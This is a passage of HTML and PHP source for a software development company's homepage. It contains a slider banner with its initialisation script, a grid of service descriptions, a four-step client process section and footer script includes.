                    <img src="css/uploads/2015/12/blurred_figures_ss1.jpg"  alt=""  width="2560" height="1360" data-bgposition="center center" data-kenburns="on" data-duration="6500" data-ease="SlowMo.ease" data-scalestart="100" data-scaleend="100" data-rotatestart="0" data-rotateend="0" data-offsetstart="0 0" data-offsetend="0 0" class="rev-slidebg" data-no-retina>
                    <!-- LAYERS -->
                    <!-- LAYER NR. 1 -->
                    <div class="tp-caption mediumthingrey2   tp-resizeme" 
                         id="slide-8-layer-1" 
                         data-x="103" 
                         data-y="71" 
                         data-width="['auto']"
                         data-height="['auto']"
                         data-transform_idle="o:1;"
                         data-transform_in="y:bottom;s:500;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="1200" 
                         data-splitin="none" 
                         data-splitout="none" 
                         data-responsive_offset="on" 
                         style="z-index: 5; white-space: nowrap;border-color:rgba(255, 214, 88, 1.00);">Hire a Developer 
                    </div>
                    <!-- LAYER NR. 2 -->
                    <div class="tp-caption black3   tp-resizeme" 
                         id="slide-8-layer-2" 
                         data-x="110" 
                         data-y="141" 
                         data-width="['auto']"
                         data-height="['auto']"
                         data-transform_idle="o:1;"
                         data-transform_in="y:bottom;s:300;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="1400" 
                         data-splitin="none" 
                         data-splitout="none" 
                         data-responsive_offset="on" 
                         style="z-index: 6; white-space: nowrap; font-weight: ;border-color:rgba(0, 0, 0, 1.00);">Looking for someone to write code for you?<br/>
                        Here we are .... 
                    </div>
                    <!-- LAYER NR. 3 -->
                    <div class="tp-caption   tp-resizeme" 
                         id="slide-8-layer-3" 
                         data-x="740" 
                         data-y="10" 
                         data-width="['none','none','none','none']"
                         data-height="['none','none','none','none']"
                         data-transform_idle="o:1;"
                         data-transform_in="x:left;s:300;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="1400" 
                         data-responsive_offset="on" 
                         style="z-index: 7;"><img src="css/uploads/revslider/business/hire.png" alt="" width="537" height="532" data-ww="397.6822429906542" data-hh="394" data-no-retina> 
                    </div>
                </li>
            </ul>
            <div class="tp-bannertimer tp-bottom" style="visibility: hidden !important;"></div>	</div>
        <script>var htmlDiv = document.getElementById("rs-plugin-settings-inline-css");
            var htmlDivCss = ".tp-caption.mediumthingrey2,.mediumthingrey2{font-size:59px;line-height:63px;font-weight:300;font-family:\"Open Sans\";color:#e1f4f9;text-decoration:none;background-color:transparent;padding:1px 4px 0px 4px;border-width:0px;border-color:rgb(255,214,88);border-style:none;text-shadow:1px 1px 1px #000;margin:0px}.tp-caption.mediumlightblack2,.mediumlightblack2{font-size:24px;line-height:40px;font-weight:300;font-family:\"Open Sans\";color:rgb(0,0,0);text-decoration:none;background-color:transparent;padding:0px;border-width:0px;border-color:rgb(255,214,88);border-style:none}.tp-caption.black3,.black3{font-size:25px;line-height:38px;color:#ededed;text-decoration:none;background-color:transparent;border-width:0px;border-color:rgb(0,0,0);border-style:none;text-shadow:1px 1px 1px #000}";
            if (htmlDiv) {
                htmlDiv.innerHTML = htmlDiv.innerHTML + htmlDivCss;
            } else {
                var htmlDiv = document.createElement("div");
                htmlDiv.innerHTML = "<style>" + htmlDivCss + "</style>";
                document.getElementsByTagName("head")[0].appendChild(htmlDiv.childNodes[0]);
            }
        </script>
        <script type="text/javascript">
            /******************************************
             -	PREPARE PLACEHOLDER FOR SLIDER	-
             ******************************************/
            var setREVStartSize = function () {
                try {
                    var e = new Object, i = jQuery(window).width(), t = 9999, r = 0, n = 0, l = 0, f = 0, s = 0, h = 0;
                    e.c = jQuery('#rev_slider_2_2');
                    e.gridwidth = [1180];
                    e.gridheight = [350];
                    e.sliderLayout = "auto";
                    if (e.responsiveLevels && (jQuery.each(e.responsiveLevels, function (e, f) {
                        f > i && (t = r = f, l = e), i > f && f > r && (r = f, n = e)
                    }), t > r && (l = n)), f = e.gridheight[l] || e.gridheight[0] || e.gridheight, s = e.gridwidth[l] || e.gridwidth[0] || e.gridwidth, h = i / s, h = h > 1 ? 1 : h, f = Math.round(h * f), "fullscreen" == e.sliderLayout) {
                        var u = (e.c.width(), jQuery(window).height());
                        if (void 0 != e.fullScreenOffsetContainer) {
                            var c = e.fullScreenOffsetContainer.split(",");
                            if (c)
                                jQuery.each(c, function (e, i) {
                                    u = jQuery(i).length > 0 ? u - jQuery(i).outerHeight(!0) : u
                                }), e.fullScreenOffset.split("%").length > 1 && void 0 != e.fullScreenOffset && e.fullScreenOffset.length > 0 ? u -= jQuery(window).height() * parseInt(e.fullScreenOffset, 0) / 100 : void 0 != e.fullScreenOffset && e.fullScreenOffset.length > 0 && (u -= parseInt(e.fullScreenOffset, 0))
                        }
                        f = u
                    } else
                        void 0 != e.minHeight && f < e.minHeight && (f = e.minHeight);
                    e.c.closest(".rev_slider_wrapper").css({height: f})

                } catch (d) {
                    console.log("Failure at Presize of Slider:" + d)
                }
            };
            setREVStartSize();
            function revslider_showDoubleJqueryError(sliderID) {
                var errorMessage = "Revolution Slider Error: You have some jquery.js library include that comes after the revolution files js include.";
                errorMessage += "<br> This includes make eliminates the revolution slider libraries, and make it not work.";
                errorMessage += "<br><br> To fix it you can:<br>&nbsp;&nbsp;&nbsp; 1. In the Slider Settings -> Troubleshooting set option:  <strong><b>Put JS Includes To Body</b></strong> option to true.";
                errorMessage += "<br>&nbsp;&nbsp;&nbsp; 2. Find the double jquery.js include and remove it.";
                errorMessage = "<span style='font-size:16px;color:#BC0C06;'>" + errorMessage + "</span>";
                jQuery(sliderID).show().html(errorMessage);
            }
            var tpj = jQuery;
            tpj.noConflict();
            var revapi2;
            tpj(document).ready(function () {
                if (tpj("#rev_slider_2_2").revolution == undefined) {
                    revslider_showDoubleJqueryError("#rev_slider_2_2");
                } else {
                    revapi2 = tpj("#rev_slider_2_2").show().revolution({
                        sliderType: "standard",
                        jsFileLocation: "//vksoftwares.com/css/plugins/revslider/public/assets/js/",
                        sliderLayout: "auto",
                        dottedOverlay: "none",
                        delay: 6000,
                        navigation: {
                            keyboardNavigation: "off",
                            keyboard_direction: "horizontal",
                            mouseScrollNavigation: "off",
                            onHoverStop: "on",
                            touch: {
                                touchenabled: "on",
                                swipe_threshold: 0.7,
                                swipe_min_touches: 1,
                                swipe_direction: "horizontal",
                                drag_block_vertical: false
                            },
                            arrows: {
                                style: "hesperiden",
                                enable: true,
                                hide_onmobile: false,
                                hide_onleave: false,
                                tmp: '',
                                left: {
                                    h_align: "right",
                                    v_align: "bottom",
                                    h_offset: 90,
                                    v_offset: 40
                                },
                                right: {
                                    h_align: "right",
                                    v_align: "bottom",
                                    h_offset: 40,
                                    v_offset: 40
                                }
                            },
                            thumbnails: {
                                style: "hesperiden",
                                enable: true,
                                width: 0,
                                height: 0,
                                min_width: 100,
                                wrapper_padding: 5,
                                wrapper_color: "transparent",
                                wrapper_opacity: "1",
                                tmp: '<span class="tp-thumb-image"></span><span class="tp-thumb-title">{{title}}</span>',
                                visibleAmount: 0,
                                hide_onmobile: true,
                                hide_under: 0,
                                hide_onleave: false,
                                direction: "horizontal",
                                span: false,
                                position: "inner",
                                space: 5,
                                h_align: "left",
                                v_align: "bottom",
                                h_offset: 40,
                                v_offset: 40
                            }
                        },
                        visibilityLevels: [1240, 1024, 778, 480],
                        gridwidth: 1180,
                        gridheight: 350,
                        lazyType: "none",
                        shadow: 0,
                        spinner: "spinner0",
                        stopLoop: "off",
                        stopAfterLoops: -1,
                        stopAtSlide: -1,
                        shuffle: "off",
                        autoHeight: "off",
                        disableProgressBar: "on",
                        hideThumbsOnMobile: "on",
                        hideSliderAtLimit: 0,
                        hideCaptionAtLimit: 0,
                        hideAllCaptionAtLilmit: 0,
                        debugMode: false,
                        fallbacks: {
                            simplifyAll: "off",
                            nextSlideOnWindowFocus: "off",
                            disableFocusListener: false,
                        }
                    });
                }
            });	/*ready*/
        </script>
    </div><!-- END REVOLUTION SLIDER -->
</div>			
</header>
</div>
<div id="Content">
    <div class="content_wrapper clearfix">
        <!-- .sections_group -->
        <div class="sections_group">
            <div class="entry-content" itemprop="mainContentOfPage">
                <div class="section mcb-section   "  style="padding-top:60px; padding-bottom:20px; background-color:#ffffff" >
                    <div class="section_wrapper mcb-section-inner">
                        <div class="wrap mcb-wrap one  clearfix" style="padding:; background-color:" >
                            <div class="column mcb-column one column_fancy_heading ">
                                <div class="fancy_heading fancy_heading_line">
                                    <div class="animate" data-anim-type="fadeInUp">
                                        <h2 class="title">See what you can avail from us</h2>
                                    </div>
                                </div>
                            </div>
                            <div class="column mcb-column one-third column_list ">
                                <div class="list_item lists_2 clearfix">
                                    <div class="animate" data-anim-type="zoomIn">
                                        <a href="software-development.php" >
                                            <div class="list_left list_icon">
                                                <i class="icon-desktop-line"></i>
                                            </div>
                                            <div class="list_right">
                                                <h4>DESKTOP APPLICATION</h4>
                                                <div class="desc">
                                                    Our desktop application development services provide you with an efficient, user-friendly, and customized desktop application that can run offline and independent of web-browser. 
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div><div class="column mcb-column one-third column_list ">
                                <div class="list_item lists_2 clearfix"><div class="animate" data-anim-type="zoomIn">
                                        <a href="mobile-application-development.php" >
                                            <div class="list_left list_icon">
                                                <i class="icon-mobile"></i>
                                            </div>
                                            <div class="list_right">
                                                <h4>MOBILE APPLICATION DEVELOPMENT</h4>
                                                <div class="desc">
                                                    The global scenario of mobile app development is currently witnessing a mammoth growth. 
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="column mcb-column one-third column_list ">
                                <div class="list_item lists_2 clearfix">
                                    <div class="animate" data-anim-type="zoomIn">
                                        <a href="web-application-development.php" >
                                            <div class="list_left list_icon">
                                                <i class="icon-network"></i>
                                            </div>
                                            <div class="list_right">
                                                <h4>WEB APPLICATION DEVELOPMENT</h4>
                                                <div class="desc">
                                                    VK Softwares is an emerging name in the Web Application Development. We give one step solutions when it comes to applications for websites, desktops and intranets.
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="column mcb-column one-third column_list ">
                                <div class="list_item lists_2 clearfix">
                                    <div class="animate" data-anim-type="zoomIn">
                                        <a href="careers.php" >
                                            <div class="list_left list_icon">
                                                <i class="icon-book-open"></i>
                                            </div>
                                            <div class="list_right">
                                                <h4>INDUSTRIAL TRAINING</h4>
                                                <div class="desc">
                                                    Six Months Industrial Training is a very crucial time period for B.E./ B.Tech and MCA students because this is the time in which candidate can explore himself in the latest technologies used in National and Multinational Industry. 
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="column mcb-column one-third column_list ">
                                <div class="list_item lists_2 clearfix">
                                    <div class="animate" data-anim-type="zoomIn">
                                        <a href="#" >
                                            <div class="list_left list_icon">
                                                <i class="icon-docs"></i>
                                            </div>
                                            <div class="list_right">
                                                <h4>DOCUMENTATION</h4>
                                                <div class="desc">
                                                    Documentation is crucial to a user’s engagement with a product. The rapid adoption of IT tools and applications—to the extent that we cannot imagine a world without them—is largely owing to the availability of documentation.
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="column mcb-column one-third column_list ">
                                <div class="list_item lists_2 clearfix">
                                    <div class="animate" data-anim-type="zoomIn">
                                        <a href="#" >
                                            <div class="list_left list_icon">
                                                <i class="icon-check"></i>
                                            </div>
                                            <div class="list_right">
                                                <h4>QUALITY ASSURANCE AND TESTING SERVICES</h4>
                                                <div class="desc">
                                                    Faster time to market. Tighter budgets. Businesses are faced with a lot of constraints today. But when it comes to testing, there is no room for error.  
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="column mcb-column one-third column_list ">
                                <div class="list_item lists_2 clearfix">
                                    <div class="animate" data-anim-type="zoomIn">
                                        <a href="#" >
                                            <div class="list_left list_icon">
                                                <i class="icon-search-line"></i>
                                            </div>
                                            <div class="list_right">
                                                <h4>SEO AND DIGITAL MARKETING</h4>
                                                <div class="desc">As the number of online businesses keeps increasing, Search Engine Optimization or SEO is becoming an important tool.</div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="column mcb-column one-third column_list ">
                                <div class="list_item lists_2 clearfix">
                                    <div class="animate" data-anim-type="zoomIn">
                                        <a href="software-development.php" >
                                            <div class="list_left list_icon">
                                                <i class="icon-windows"></i>
                                            </div>
                                            <div class="list_right">
                                                <h4>SOFTWARE DEVELOPMENT</h4>
                                                <div class="desc">
                                                    VK Softwares believes in channelization of thoughts and requirements. VK Softwares is an emerging Software development company which is making its roots stronger with each passing day. 
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="section mcb-section"  style="padding-top:50px; padding-bottom:0px; background-color:" >
                    <div class="section_wrapper mcb-section-inner">
                        <div class="wrap mcb-wrap one  clearfix" style="padding:; background-color:" >
                            <div class="column mcb-column one column_fancy_heading ">
                                <div class="fancy_heading fancy_heading_arrows">
                                    <div class="animate" data-anim-type="bounceInUp">
                                        <h2 class="title">
                                            <i class="icon-right-dir"></i>
                                            See how we make our clients Happy
                                            <i class="icon-left-dir"></i>
                                        </h2>
                                        <div class="inside">
                                            <span class="big">
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="column mcb-column one-fourth column_icon_box ">
                                <div class="animate" data-anim-type="zoomIn">
                                    <div class="icon_box icon_position_top no_border">
                                        <a class="" href="#"  >
                                            <div class="image_wrapper">
                                                <img src="css/uploads/2014/11/boss_step_1-1.png" alt="Idea" class="scale-with-grid" width="80" height="80"/>
                                            </div>
                                            <div class="desc_wrapper">
                                                <h4>Idea</h4>
                                                <div class="desc">
                                                    Have an Idea?
                                                    Within 24 hours, we analyze the idea
                                                    and give you the best advice for your needs.
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="column mcb-column one-fourth column_icon_box ">
                                <div class="animate" data-anim-type="zoomIn">
                                    <div class="icon_box icon_position_top no_border">
                                        <a class="" href="#"  >
                                            <div class="image_wrapper">
                                                <img src="css/uploads/2014/11/boss_step_2-1.png" alt="Connect" class="scale-with-grid" width="80" height="80"/>
                                            </div>
                                            <div class="desc_wrapper">
                                                <h4>Connect</h4>
                                                <div class="desc">
                                                    Describe your Idea!
                                                    The better you describe, the better 
                                                    input we will provide.
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="column mcb-column one-fourth column_icon_box ">
                                <div class="animate" data-anim-type="zoomIn">
                                    <div class="icon_box icon_position_top no_border">
                                        <a class="" href="#"  >
                                            <div class="image_wrapper">
                                                <img src="css/uploads/2014/11/boss_step_3-1.png" alt="Create" class="scale-with-grid" width="80" height="80"/>
                                            </div>
                                            <div class="desc_wrapper">
                                                <h4>Create</h4>
                                                <div class="desc">
                                                    Crafting your Idea!
                                                    We use the best tool available in market
                                                    to bring your Idea into Life.
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="column mcb-column one-fourth column_icon_box ">
                                <div class="animate" data-anim-type="zoomIn">
                                    <div class="icon_box icon_position_top no_border">
                                        <a class="" href="#"  >
                                            <div class="image_wrapper">
                                                <img src="css/uploads/2014/11/boss_step_4-1.png" alt="Get Going" class="scale-with-grid" width="80" height="80"/>
                                            </div>
                                            <div class="desc_wrapper"><h4>Get Going</h4>
                                                <div class="desc">
                                                    See your Idea grow!
                                                    View increasing your sales and profits. 
                                                    This is so easy!
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="section the_content no_content">
                    <div class="section_wrapper">
                        <div class="the_content_wrapper">
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>		
<footer id="Footer" class="clearfix">
    <div class="footer_copy">
        <div class="container">
            <div class="column one">
                <a id="back_to_top" class="button button_left button_js " href="#"><span class="button_icon"><i class="icon-up-open-big"></i></span></a>
                <!-- Copyrights -->
                <div class="copyright">
                    © <?php echo date("Y"); ?>  VKSoftwares. All Rights Reserved. <a target="_blank" rel="nofollow" href="index.php">VKSoftwares</a>
                </div>                						
            </div>
        </div>
    </div>
</footer>
</div>
<script type='text/javascript' src='js/js/jquery/ui/core.mine899e899.js?ver=1.11.4'></script>
<script type='text/javascript' src='js/js/jquery/ui/widget.mine899e899.js?ver=1.11.4'></script>
<script type='text/javascript' src='js/js/jquery/ui/mouse.mine899e899.js?ver=1.11.4'></script>
<script type='text/javascript' src='js/js/jquery/ui/resizable.mine899e899.js?ver=1.11.4'></script>
<script type='text/javascript' src='js/js/jquery/ui/draggable.mine899e899.js?ver=1.11.4'></script>
<script type='text/javascript' src='js/js/jquery/ui/button.mine899e899.js?ver=1.11.4'></script>
<script type='text/javascript' src='js/js/jquery/ui/position.mine899e899.js?ver=1.11.4'></script>
<script type='text/javascript' src='js/js/jquery/ui/dialog.mine899e899.js?ver=1.11.4'></script>
<script type='text/javascript' src='js/js/wpdialog.minb523b523.js?ver=4.3.3'></script>
<script type='text/javascript' src='css/plugins/contact-form-7/includes/js/jquery.form.mind03dd03d.js?ver=3.51.0-2014.06.20'></script>
<script type='text/javascript' src='css/plugins/contact-form-7/includes/js/scripts5b315b31.js?ver=4.3.1'></script>
<script type='text/javascript' src='js/js/jquery/ui/sortable.mine899e899.js?ver=1.11.4'></script>
<script type='text/javascript' src='js/js/jquery/ui/tabs.mine899e899.js?ver=1.11.4'></script>
<script type='text/javascript' src='js/js/jquery/ui/accordion.mine899e899.js?ver=1.11.4'></script>
<script type='text/javascript' src='css/themes/betheme/js/plugins2c4c2c4c.js?ver=10.9'></script>
<script type='text/javascript' src='css/themes/betheme/js/menu2c4c2c4c.js?ver=10.9'></script>
<script type='text/javascript' src='css/themes/betheme/assets/animations/animations.min2c4c2c4c.js?ver=10.9'></script>
<script type='text/javascript' src='css/themes/betheme/assets/jplayer/jplayer.min2c4c2c4c.js?ver=10.9'></script>
<script type='text/javascript' src='css/themes/betheme/js/scripts2c4c2c4c.js?ver=10.9'></script>
<script type='text/javascript' src='js/js/comment-reply.minb523b523.js?ver=4.3.3'></script>
<script type="text/javascript" src="js/public/assets/js/extensions/revolution.extension.slideanims.min.js"></script>
<script type="text/javascript" src="js/public/assets/js/extensions/revolution.extension.actions.min.js"></script>
<script type="text/javascript" src="js/public/assets/js/extensions/revolution.extension.layeranimation.min.js"></script>
<script type="text/javascript" src="js/public/assets/js/extensions/revolution.extension.kenburn.min.js"></script>
<script type="text/javascript" src="js/public/assets/js/extensions/revolution.extension.navigation.min.js"></script>

</body>
</html>